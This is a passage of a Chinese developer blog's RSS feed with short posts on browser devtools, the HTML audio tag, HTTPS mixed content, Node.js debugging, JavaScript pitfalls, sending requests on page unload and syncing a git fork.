&lt;h1 id=&#34;2-ie&#34;&gt;2. IE&lt;/h1&gt;
&lt;p&gt;如图所示是ie11的dev tool点击下来箭头，也可以选择不同的iframe执行环境。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180208135527_niIzO1_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-其他浏览器&#34;&gt;3. 其他浏览器&lt;/h1&gt;
&lt;p&gt;其他浏览器可以自行摸索一下。。。（G_H）&lt;/p&gt;</description>
    </item>
    <item>
      <title>Audio 如果你愿意一层一层剥开我的心</title>
      <link>https://wdd.js.org/posts/2018/02/audio-heart-detail/</link>
      <pubDate>Thu, 08 Feb 2018 09:44:01 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/audio-heart-detail/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;我觉得DOM就好像是元素周期表里的元素，JS就好像是实验器材，通过各种化学反应，产生各种魔术。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180208094439_zGRL80_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-audio&#34;&gt;1. Audio&lt;/h1&gt;
&lt;p&gt;通过打开谷歌浏览器的dev tools -&amp;gt; Settings -&amp;gt; Elements -&amp;gt; Show user agent shadow DOM, 你可以看到其实Audio标签也是由常用的 input标签和div等标签合成的。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180208094451_tBBQUM_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-基本用法&#34;&gt;2. 基本用法&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1 &amp;lt;audio src=&amp;#34;http://65.ierge.cn/12/186/372266.mp3&amp;#34;&amp;gt;
Your browser does not support the audio element.
&amp;lt;/audio&amp;gt;

&amp;lt;br&amp;gt;

2 &amp;lt;audio src=&amp;#34;http://65.ierge.cn/12/186/372266.mp3&amp;#34; controls=&amp;#34;controls&amp;#34;&amp;gt;
Your browser does not support the audio element.
&amp;lt;/audio&amp;gt;

&amp;lt;br&amp;gt;

// controlsList属性目前只支持 chrome 58+
3 &amp;lt;audio src=&amp;#34;http://65.ierge.cn/12/186/372266.mp3&amp;#34; controls=&amp;#34;controls&amp;#34; controlsList=&amp;#34;nodownload&amp;#34;&amp;gt; 
Your browser does not support the audio element.
&amp;lt;/audio&amp;gt;

&amp;lt;br&amp;gt;

4 &amp;lt;audio controls=&amp;#34;controls&amp;#34;&amp;gt;
&amp;lt;source src=&amp;#34;http://65.ierge.cn/12/186/372266.mp3&amp;#34; type=&amp;#39;audio/mp3&amp;#39; /&amp;gt;
&amp;lt;/audio&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;你可以看出他们在Chrome里表现的差异&lt;/p&gt;</description>
    </item>
    <item>
      <title>可能被遗漏的https与http的知识点</title>
      <link>https://wdd.js.org/posts/2018/02/you-dont-know-https-and-http/</link>
      <pubDate>Thu, 08 Feb 2018 09:10:59 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/you-dont-know-https-and-http/</guid>
      <description>&lt;h1 id=&#34;1-https域向http域发送请求会被浏览器直接拒绝http向https则不会&#34;&gt;1. HTTPS域向HTTP域发送请求会被浏览器直接拒绝，HTTP向HTTPS则不会&lt;/h1&gt;
&lt;p&gt;例如在github pages页面，这是一个https页面，如果在这个页面向http发送请求，那么会直接被浏览器拒绝，并在控制台输出下面的报错信息。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;jquery-1.11.3.min.js:5 Mixed Content: The page at &amp;#39;https://wangduanduan.github.io/ddddddd/&amp;#39; was loaded over HTTPS, but requested an insecure XMLHttpRequest endpoint &amp;#39;http://cccccc/log/conf?token=welljoint&amp;#39;. This request has been blocked; the content must be served over HTTPS.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;如果你在做第三方集成的系统，如果他们是在浏览器中直接调用你提供的接口，&lt;code&gt;那么最好你使用https协议，这样无论对方是https还是http都可以访问&lt;/code&gt;。（相信我，这个很重要，我曾经经历过上线后遇到这个问题，然后连夜申请证书，把http升级到https的痛苦经历）&lt;/p&gt;
&lt;h1 id=&#34;2-https的默认端口是443而不是443&#34;&gt;2. HTTPS的默认端口是443，而不是443&lt;/h1&gt;
&lt;p&gt;如果443端口已经被其他服务占用了，那么使用其他任何没有被占用的端口都可以用作HTTPS服务，只不过在请求的时候需要加上端口号罢了。&lt;/p&gt;
&lt;h1 id=&#34;3-如何快速隐藏一个dom元素&#34;&gt;3. 如何快速隐藏一个DOM元素&lt;/h1&gt;
&lt;p&gt;选中一个元素，然后按&lt;code&gt;h&lt;/code&gt;,这时候就会在选中的DOM元素上加上&lt;code&gt;__web-inspector-hide-shortcut__&lt;/code&gt;类，这个类会让元素隐藏。谷歌和火狐上都可以，IE上没有试过行不行。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180208091217_HDF1vL_Screenshot.jpeg&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>直接在Chrome DevTools调试Node.js</title>
      <link>https://wdd.js.org/posts/2018/02/debug-nodejs-in-chrome-devtool/</link>
      <pubDate>Wed, 07 Feb 2018 14:15:43 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/debug-nodejs-in-chrome-devtool/</guid>
      <description>&lt;p&gt;英文好的，直接看原文&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.hospodarets.com/nodejs-debugging-in-chrome-devtools&#34;&gt;https://blog.hospodarets.com/nodejs-debugging-in-chrome-devtools&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;h1 id=&#34;1-要求&#34;&gt;1. 要求&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Node.js 6.3+&lt;/li&gt;
&lt;li&gt;Chrome 55+&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;2-操作步骤&#34;&gt;2. 操作步骤&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;1 打开连接 &lt;code&gt;chrome://flags/#enable-devtools-experiments&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;2 开启&lt;code&gt;开发者工具实验性功能&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;3 重启浏览器&lt;/li&gt;
&lt;li&gt;4 打开 DevTools Setting -&amp;gt; Experiments tab&lt;/li&gt;
&lt;li&gt;5 按6次shift后，隐藏的功能会出现，勾选&amp;quot;Node debugging&amp;quot;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180207141627_9HT0nS_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180207141636_hIfIyG_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-运行程序&#34;&gt;3. 运行程序&lt;/h1&gt;
&lt;p&gt;必须要有 &lt;code&gt;--inspect&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;gt; node --inspect www
Debugger listening on port 9229.
Warning: This is an experimental feature and could change at any time.
To start debugging, open the following URL in Chrome:
    chrome-devtools://devtools/remote/serve_file/@60cd6e859b9f557d2312f5bf532f6aec5f284980/inspector.html?experiments=true&amp;amp;v8only=true&amp;amp;ws=localhost:9229/78a884f4-8c2e-459e-93f7-e1cbe87cf5cf
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;将这个地址粘贴到谷歌浏览器：&lt;code&gt;chrome-devtools://devtools/remote/serve_file/@60cd6e859b9f557d2312f5bf532f6aec5f284980/inspector.html?experiments=true&amp;amp;v8only=true&amp;amp;ws=localhost:9229/78a884f4-8c2e-459e-93f7-e1cbe87cf5cf&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;程序后端输出的日志也回输出到谷歌浏览器的console里面，同时也可以在Sources里进行断点调试了。
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180207141649_ArMyV7_Screenshot.jpeg&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>【译】13简单的优秀编码规则（从我15年的经验）</title>
      <link>https://wdd.js.org/posts/2018/02/few-simple-rules-for-good-coding-my-15-years-experience/</link>
      <pubDate>Wed, 07 Feb 2018 14:03:12 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/few-simple-rules-for-good-coding-my-15-years-experience/</guid>
      <description>&lt;p&gt;原文地址：https://hackernoon.com/few-simple-rules-for-good-coding-my-15-years-experience-96cb29d4acd9#.ddzpjb80c&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/img/images/20180207140343_0UaL3X_Screenshot.jpeg&#34;&gt;&lt;/p&gt;
&lt;p&gt;嗨，我的工作作为一个程序员超过15年，并使用许多不同的语言，范例，框架和其他狗屎。我想和大家分享我写好代码的规则。&lt;/p&gt;
&lt;h1 id=&#34;1-优化vs可读性-去他妈的优化&#34;&gt;1. 优化VS可读性 去他妈的优化&lt;/h1&gt;
&lt;p&gt;始终编​​写易于阅读且对开发人员可理解的代码。因为在硬可读代码上花费的时间和资源将远远高于从优化中获得的。
如果你需要进行优化，那么使它像DI的独立模块，具有100％的测试覆盖率，并且不会被触及至少一年。&lt;/p&gt;
&lt;h1 id=&#34;2-架构第一&#34;&gt;2. 架构第一&lt;/h1&gt;
&lt;p&gt;我看到很多人说“我们需要快速做事，我们没有时间做架构”。其中约99％的人因为这样的想法而遇到了大问题。
编写代码而不考虑其架构是没有用的，就像没有实现它们的计划一样，梦想你的愿望。
在编写代码的第一行之前，你应该明白它将要做什么，它将如何使用，模块，服务如何相互工作，它将有什么结构，如何进行测试和调试，以及如何更新。&lt;/p&gt;
&lt;h1 id=&#34;3-测试覆盖率&#34;&gt;3. 测试覆盖率&lt;/h1&gt;
&lt;p&gt;测试是好事，但他们并不总是负担得起，对项目有意义。&lt;/p&gt;
&lt;p&gt;当你需要测试：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当你编写模块时，微服务将不会被触及至少一个月。&lt;/li&gt;
&lt;li&gt;当你编写开源代码。&lt;/li&gt;
&lt;li&gt;当你编写涉及金融渠道的核心代码或代码。&lt;/li&gt;
&lt;li&gt;当您有代码更新的同时更新测试的资源。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当你不需要测试时：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;当你是一个创业。&lt;/li&gt;
&lt;li&gt;当你有小团队和代码更改是快速。&lt;/li&gt;
&lt;li&gt;当你编写的脚本，可以简单地通过他们的输出手动测试。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;记住，&lt;code&gt;带有严格测试的代码可能比没有测试的代码更有害&lt;/code&gt;。&lt;/p&gt;
&lt;h1 id=&#34;4-保持简单极度简单&#34;&gt;4. 保持简单，极度简单&lt;/h1&gt;
&lt;p&gt;不要编写复杂的代码。更多更简单，那么更少的错误它可能有和更少的时间来调试它们。代码应该做的只是它需要没有非常多的抽象和其他OOP shit（尤其是涉及java开发人员）+ 20％的东西可能需要在将来以简单的方式更新它。&lt;/p&gt;
&lt;h1 id=&#34;5-注释&#34;&gt;5. 注释&lt;/h1&gt;
&lt;p&gt;出现注释说明你的代码不够好。好的代码应该是可以理解的，没有一行注释。但是如何为新开发人员节省时间？ - 编写简单的内联文档描述什么和如何方法工作。这将节省很多时间来理解，甚至更多 - 它将给人们更多的机会来提出更好的实施这种方法。并且它将是全球代码文档的良好开端。&lt;/p&gt;
&lt;h1 id=&#34;6-硬耦合vs较小耦合&#34;&gt;6. 硬耦合VS较小耦合&lt;/h1&gt;
&lt;p&gt;始终尝试使用微服务架构。单片软件可以比微服务软件运行得更快，但只能在一个服务器的上下文中运行。
微服务使您可以不仅在许多服务器上，而且有时甚至在一台机器上（我的意思是过程分发）高效地分发您的软件。&lt;/p&gt;
&lt;h1 id=&#34;7-代码审查&#34;&gt;7. 代码审查&lt;/h1&gt;
&lt;p&gt;代码审查可以是好的，也以是坏的。
您可以组织代码审查，只有当您有开发人员了解95％的代码，谁可以监控所有更新，而不浪费很多时间。在其他情况下，这将是只是耗时，每个人都会讨厌这个。&lt;/p&gt;
&lt;p&gt;在这部分有很多问题，所以更深入地描述这一点。&lt;/p&gt;
&lt;p&gt;许多人认为代码审查是一个很好的方式教新手，或者工作在不同部分的代码的队友。但是代码审查的主要目标是保持代码质量，而不是教学。让我们想象你的团队制作代码用于控制核反应堆或太空火箭发动机的冷却系统。你在非常硬的逻辑中犯了巨大的错误，然后你给这个代码审查新的家伙。你怎么认为会发生意外的风险？ - 我的练习率超过70％。&lt;/p&gt;
&lt;p&gt;良好的团队是每个人都有自己的角色，负责确切的工作。如果有人想要理解另一段代码，那么他去一个负责任去问他。你不可能知道一切，更好的优秀的理解小块代码而不是理解所有。&lt;/p&gt;
&lt;h1 id=&#34;8-重构没啥用&#34;&gt;8. 重构没啥用&lt;/h1&gt;
&lt;p&gt;在我的职业生涯中，我听到很多次“不要担心，我们以后会重构它”。在未来，这会导致大的技术债务或从头开始删除所有的代码和写作。&lt;/p&gt;
&lt;p&gt;所以，不要得到一个债务，除非你有钱从头开发你的软件几次。&lt;/p&gt;
&lt;h1 id=&#34;9-当你累了或在一个坏的心情不要写代码&#34;&gt;9. 当你累了或在一个坏的心情不要写代码。&lt;/h1&gt;
&lt;p&gt;当开发人员厌倦时，他们正在制造2到5倍或者更多的bug。所以工作更多是非常糟糕的做法。这就是为什么越来越多的国家思考6小时工作日，其中一些已经有了。精神工作不同于使用你的二头肌。&lt;/p&gt;
&lt;h1 id=&#34;10-不要一次写全部---使开发迭代&#34;&gt;10. 不要一次写全部 - 使开发迭代&lt;/h1&gt;
&lt;p&gt;在编写代码分析和预测之前，您的客户/客户真正需要什么，然后选择您可以在短期内以高质量开发的MVF（最有价值的功能）。使用这样的迭代来部署质量更新，而不是腰部时间和资源对不合理的愿望和牺牲与质量。&lt;/p&gt;
&lt;h1 id=&#34;11-自动化vs手动&#34;&gt;11. 自动化VS手动&lt;/h1&gt;
&lt;p&gt;自动化是长期的100％成功。所以如果你有资源自动化的东西，现在应该做。你可能认为“只需要5分钟，为什么我应该自动化？但让我计算这个。例如，它是5个开发人员的日常任务。 5分钟* 5天* 21天* 12个月= 6 300分钟= 105小时= 13.125天〜5250 $。
如果你有40 000名员工，这将需要多少费用？&lt;/p&gt;</description>
    </item>
    <item>
      <title>JavaScript 高级技巧</title>
      <link>https://wdd.js.org/posts/2018/02/js-high-skills/</link>
      <pubDate>Wed, 07 Feb 2018 10:14:56 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/js-high-skills/</guid>
      <description>&lt;h2 id=&#34;01-安全类型检测&#34;&gt;0.1. 安全类型检测&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;javascript内置类型检测并不可靠&lt;/li&gt;
&lt;li&gt;safari某些版本（&amp;lt;4）typeof正则表达式返回为function&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;建议使用Object.prototype.toString.call()方法检测数据类型&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;
    function isArray(value){
        return Object.prototype.toString.call(value) === &amp;#34;[object Array]&amp;#34;;
    }
    
    function isFunction(value){
        return Object.prototype.toString.call(value) === &amp;#34;[object Function]&amp;#34;;
    }
    
    function isRegExp(value){
        return Object.prototype.toString.call(value) === &amp;#34;[object RegExp]&amp;#34;;
    }
    
    function isNativeJSON(){
        return window.JSON &amp;amp;&amp;amp; Object.prototype.toString.call(JSON) === &amp;#34;[object JSON]&amp;#34;;
    }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;对于ie中一COM对象形式实现的任何函数，isFunction都返回false，因为他们并非原生的javascript函数。&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在web开发中，能够区分原生与非原生的对象非常重要。只有这样才能确切知道某个对象是否有哪些功能&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;以上所有的正确性的前提是：Object.prototype.toString没有被修改过&lt;/p&gt;
&lt;h2 id=&#34;02-作用域安全的构造函数&#34;&gt;0.2. 作用域安全的构造函数&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;function Person(name){
    this.name = name;
}

//使用new来创建一个对象
var one = new Person(&amp;#39;wdd&amp;#39;);

//直接调用构造函数
Person();
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;由于this是运行时分配的，如果你使用new来操作，this指向的就是one。如果直接调用构造函数，那么this会指向全局对象window,然后你的代码就会覆盖window的原生name。如果有其他地方使用过window.name, 那么你的函数将会埋下一个深藏的bug。&lt;/p&gt;
&lt;p&gt;==那么，如何才能创建一个作用域安全的构造函数？==
方法1&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;function Person(name){
    if(this instanceof Person){
        this.name = name;
    }
    else{
        return new Person(name);
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;1-惰性载入函数&#34;&gt;1. 惰性载入函数&lt;/h1&gt;
&lt;p&gt;假设有一个方法X，在A类浏览器里叫A,在b类浏览器里叫B,有些浏览器并没有这个方法,你想实现一个跨浏览器的方法。&lt;/p&gt;</description>
    </item>
    <item>
      <title>突然觉得自己好像没学过JS</title>
      <link>https://wdd.js.org/posts/2018/02/i-realy-dont-know-js/</link>
      <pubDate>Wed, 07 Feb 2018 10:09:42 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/i-realy-dont-know-js/</guid>
      <description>&lt;h2 id=&#34;01-先看题mean的值是什么&#34;&gt;0.1. 先看题：mean的值是什么？&lt;/h2&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var scores = [10,11,12];
var total = 0;

for(var score in scores){
  total += score;
}

var mean = total/scores.length;
console.log(mean);
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;02-是11&#34;&gt;0.2. 是11？&lt;/h2&gt;
&lt;p&gt;恭喜你：答错了！&lt;/p&gt;
&lt;h2 id=&#34;03-是1&#34;&gt;0.3. 是1？&lt;/h2&gt;
&lt;p&gt;恭喜你：答错了！&lt;/p&gt;
&lt;h2 id=&#34;04-正确答案-4&#34;&gt;0.4. 正确答案： 4&lt;/h2&gt;
&lt;p&gt;解释： &lt;code&gt;for in 循环循环的值永远是key, key是一个字符串&lt;/code&gt;。所以total的值是：&amp;lsquo;0012&amp;rsquo;。它是一个字符串，字符串&#39;0012&amp;rsquo;/3,0012会被转换成12，然后除以3，结果是4。&lt;/p&gt;
&lt;h2 id=&#34;05-后记&#34;&gt;0.5. 后记&lt;/h2&gt;
&lt;p&gt;这个示例是来自《编写高质量JavaScript的68个方法》的第49条：&lt;code&gt;数组迭代要优先使用for循环而不是for in循环&lt;/code&gt;。
既然已经发布，就可能有好事者拿出去当面试题。这个题目很有可能坑一堆人。其中包括我。&lt;/p&gt;
&lt;p&gt;这里涉及到许多js的基础知识.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;code&gt;for in 循环是循环对象的索引属性，key是一个字符串。&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;数值类型和字符串相加，会自动转换为字符串&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;字符串除以数值类型，会先把字符串转为数值，最终结果为数值&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;正确方法&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;var scores = [10,11,12];
var total = 0;

for(var i=0, n=scores.length; i &amp;lt; n; i++){
  total += scores[i];
}

var mean = total/scores.length;
console.log(mean);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样写有几个好处。&lt;/p&gt;</description>
    </item>
    <item>
      <title>发起Ajax请求当页面onunload</title>
      <link>https://wdd.js.org/posts/2018/02/send-ajax-when-page-unload/</link>
      <pubDate>Wed, 07 Feb 2018 09:18:54 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/02/send-ajax-when-page-unload/</guid>
      <description>&lt;h2 id=&#34;01-同步ajax&#34;&gt;0.1. 同步Ajax&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;这种需求主要用于当浏览器关闭，或者刷新时，向后端发起Ajax请求。&lt;/p&gt;&lt;/blockquote&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;window.onunload = function(){
    $.ajax({url:&amp;#34;http://localhost:8888/test.php?&amp;#34;, async:false});
};
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用&lt;code&gt;async：false&lt;/code&gt;参数使请求同步（默认是异步的）。&lt;/p&gt;
&lt;p&gt;同步请求锁定浏览器，直到完成。 如果请求是异步的，页面只是继续卸载。 它足够快，以至于该请求甚至没有时间触发。服务端很可能收不到请求。&lt;/p&gt;
&lt;h2 id=&#34;02-navigatorsendbeacon&#34;&gt;0.2. navigator.sendBeacon&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;优点&lt;/code&gt;：简洁、异步、非阻塞
&lt;code&gt;缺点&lt;/code&gt;：这是实验性的技术，并非所有浏览器都支持。其中IE和safari不支持该技术。&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;window.addEventListener(&amp;#39;unload&amp;#39;, logData, false);

function logData() {
  navigator.sendBeacon(&amp;#34;/log&amp;#34;, analyticsData);
}
&lt;/code&gt;&lt;/pre&gt;&lt;blockquote&gt;
&lt;p&gt;参考：http://stackoverflow.com/questions/1821625/ajax-request-with-jquery-on-page-unload
参考：https://developer.mozilla.org/en-US/docs/Web/API/Navigator/sendBeacon&lt;/p&gt;&lt;/blockquote&gt;</description>
    </item>
    <item>
      <title>git合并上游仓库即同步fork后的仓库</title>
      <link>https://wdd.js.org/posts/2018/01/fork-sync-learn/</link>
      <pubDate>Wed, 31 Jan 2018 17:16:44 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/01/fork-sync-learn/</guid>
      <description>&lt;h1 id=&#34;1-前提说明&#34;&gt;1. 前提说明&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;仓库A: &lt;a href=&#34;http://gitlab.tt.cc:30000/fe/omp.git&#34;&gt;http://gitlab.tt.cc:30000/fe/omp.git&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;仓库B: 仓库Bfork自仓库A, 仓库A的地址是：http://gitlab.tt.cc:30000/wangdd/omp.git&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;某一时刻，仓库A更新了。仓库B需要同步上游分支的更新。&lt;/p&gt;
&lt;h1 id=&#34;2-本地操作&#34;&gt;2. 本地操作&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;// 1 查看远程分支
➜  omp git:(master) git remote -v
origin	http://gitlab.tt.cc:30000/wangdd/omp.git (fetch)
origin	http://gitlab.tt.cc:30000/wangdd/omp.git (push)

// 2 添加一个远程同步的上游仓库
➜  omp git:(master) git remote add upstream http://gitlab.tt.cc:30000/fe/omp.git
➜  omp git:(master) git remote -v
origin	http://gitlab.tt.cc:30000/wangdd/omp.git (fetch)
origin	http://gitlab.tt.cc:30000/wangdd/omp.git (push)
upstream	http://gitlab.tt.cc:30000/fe/omp.git (fetch)
upstream	http://gitlab.tt.cc:30000/fe/omp.git (push)

// 3 拉去上游分支到本地，并且会被存储在一个新分支upstream/master
➜  omp git:(master) git fetch upstream
remote: Counting objects: 4, done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 4 (delta 2), reused 0 (delta 0)
Unpacking objects: 100% (4/4), done.
From http://gitlab.tt.cc:30000/fe/omp
 * [new branch]      master     -&amp;gt; upstream/master

// 4 将upstream/master分支合并到master分支，由于我已经在master分支，此处就不在切换到master分支
➜  omp git:(master) git merge upstream/master
Updating 29c098c..6413803
Fast-forward
 README.md | 1 +
 1 file changed, 1 insertion(+)

// 5 查看一下，此次合并，本地有哪些更新
➜  omp git:(master) git log -p

// 6 然后将更新推送到仓库B
➜  omp git:(master) git push
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;3-总结&#34;&gt;3. 总结&lt;/h1&gt;
&lt;p&gt;通过上述操作，仓库B就同步了仓库A的代码。整体的逻辑就是将&lt;code&gt;上游分支拉去到本地，然后合并到本地分支上&lt;/code&gt;。就这么简单。&lt;/p&gt;</description>
    </item>
    <item>
      <title>关于我</title>
      <link>https://wdd.js.org/about/</link>
      <pubDate>Wed, 31 Jan 2018 12:09:09 +0800</pubDate>
      <guid>https://wdd.js.org/about/</guid>
      <description>&lt;p&gt;&lt;img alt=&#34;Travis&#34; loading=&#34;lazy&#34; src=&#34;https://img.shields.io/travis/wangduanduan/wangduanduan.github.io.svg&#34;&gt; &lt;img alt=&#34;GitHub last commit&#34; loading=&#34;lazy&#34; src=&#34;https://img.shields.io/github/last-commit/wangduanduan/wangduanduan.github.io.svg&#34;&gt;  &lt;img alt=&#34;GitHub issues&#34; loading=&#34;lazy&#34; src=&#34;https://img.shields.io/github/issues/wangduanduan/wangduanduan.github.io.svg&#34;&gt;  &lt;img alt=&#34;GitHub closed issues&#34; loading=&#34;lazy&#34; src=&#34;https://img.shields.io/github/issues-closed/wangduanduan/wangduanduan.github.io.svg&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;个人简介&#34;&gt;个人简介&lt;/h1&gt;
&lt;p&gt;我是Eddie Wang！&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;精通JavaScript/Node.js，现在的兴趣是学习rust&lt;/li&gt;
&lt;li&gt;精通VOIP相关技术栈：SIP/opensips/kamailio等等&lt;/li&gt;
&lt;li&gt;精通VIM&lt;/li&gt;
&lt;li&gt;email: &lt;a href=&#34;mailto:eddie0501@qq.com&#34;&gt;eddie0501@qq.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Github: &lt;a href=&#34;https://github.com/wangduanduan&#34;&gt;github.com/wangduanduan&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;语雀: &lt;a href=&#34;https://yuque.com/wangdd&#34;&gt;yuque.com/wangdd&lt;/a&gt;, 将不会更新&lt;/li&gt;
&lt;li&gt;个人博客: &lt;a href=&#34;https://wdd.js.org&#34;&gt;wdd.js.org&lt;/a&gt;, 最新内容将会发布在wdd.js.org&lt;/li&gt;
&lt;li&gt;最喜欢的美剧《黄石》&lt;/li&gt;
&lt;li&gt;喜欢读书、美剧、做饭&lt;/li&gt;
&lt;li&gt;微信阅读资深会员/365天阅读挑战赛&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/about/atta/2025-07-04-05-19-13.png&#34;&gt;
&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/about/atta/2025-07-04-05-21-57.png&#34;&gt;&lt;/p&gt;

&lt;span&gt;
  &lt;img align=&#34;center&#34; src=&#34;https://github-readme-stats.vercel.app/api?username=wangduanduan&amp;count_private=true&amp;show_icons=true&amp;&amp;theme=onedark&#34; /&gt;
&lt;/span&gt;
&lt;span&gt;
  &lt;img align=&#34;center&#34; src=&#34;https://github-readme-stats.vercel.app/api/top-langs/?username=wangduanduan&amp;theme=onedark&amp;layout=compact&#34; /&gt;
&lt;/span&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/ryo-ma/github-profile-trophy&#34;&gt;&lt;img alt=&#34;trophy&#34; loading=&#34;lazy&#34; src=&#34;https://github-profile-trophy.vercel.app/?username=wangduanduan&amp;theme=onedark&amp;rank=SECRET,SSS,SS,S,AAA,AA,A&#34;&gt;&lt;/a&gt;&lt;/p&gt;


&lt;iframe frameborder=&#34;no&#34; border=&#34;0&#34; marginwidth=&#34;0&#34; marginheight=&#34;0&#34; width=330 height=86 src=&#34;//music.163.com/outchain/player?type=2&amp;id=1902127843&amp;auto=1&amp;height=66&#34;&gt;&lt;/iframe&gt;


&lt;h1 id=&#34;博客说明&#34;&gt;博客说明&lt;/h1&gt;
&lt;p&gt;博客取名为洞香春，灵感来自孙皓晖所著&lt;a href=&#34;https://book.douban.com/subject/3079029/&#34;&gt;《大秦帝国》&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;洞香春大致在战国时代中期所在地：魏国安邑。&lt;/p&gt;
&lt;p&gt;战国时期，社会制度发生着巨大变化，工商业日益兴旺，出现了以白圭为首的一批巨贾商人，而位于魏国安邑的洞香春酒肆就是白氏家族创办的产业中最为著名的一个。&lt;/p&gt;
&lt;p&gt;洞香春以名士荟萃、谈论国事、交流思想而著称于当时列国&lt;/p&gt;
&lt;h1 id=&#34;如何订阅博客&#34;&gt;如何订阅博客&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;添加RSS订阅： &lt;a href=&#34;https://wdd.js.org/index.xml&#34;&gt;https://wdd.js.org/index.xml&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    <item>
      <title>如何写好接口文档？</title>
      <link>https://wdd.js.org/posts/2018/01/how-to-write-better-api-docs/</link>
      <pubDate>Mon, 29 Jan 2018 22:01:55 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2018/01/how-to-write-better-api-docs/</guid>
